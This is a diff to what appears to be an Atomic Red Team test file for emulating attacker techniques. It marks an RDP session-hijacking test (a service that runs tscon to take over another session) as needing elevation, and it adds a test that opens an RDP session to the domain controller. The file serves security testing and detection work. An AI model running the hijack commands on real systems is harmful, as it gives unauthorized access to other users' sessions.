@@ -13,8 +13,36 @@ atomic_tests:
 
   executor:
     name: command_prompt
+    elevation_required: true
     command: |
       query user
       sc.exe create sesshijack binpath= "cmd.exe /k tscon 1337 /dest:rdp-tcp#55"
       net start sesshijack
       sc.exe delete sesshijack
+
+- name: RDPto-DomainController
+  description: |
+    Attempt an RDP session via "Connect-RDP" to a system. Default RDPs to (%logonserver%) as the current user
+
+  supported_platforms:
+    - windows
+
+  input_arguments:
+    
+    logonserver:
+      description: ComputerName argument default %logonserver%
+      type: String
+      default: $ENV:logonserver.TrimStart("\")
+    
+    username:
+      description: Username argument default %USERDOMAIN%\%username%
+      type: String
+      default: $Env:USERDOMAIN\$ENV:USERNAME
+
+  executor:
+    name: powershell
+    elevation_required: false
+    prereq_command: |
+      if((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain) {0} else {1}
+    command: |
+      Connect-RDP -ComputerName #{logonserver} -User #{username}
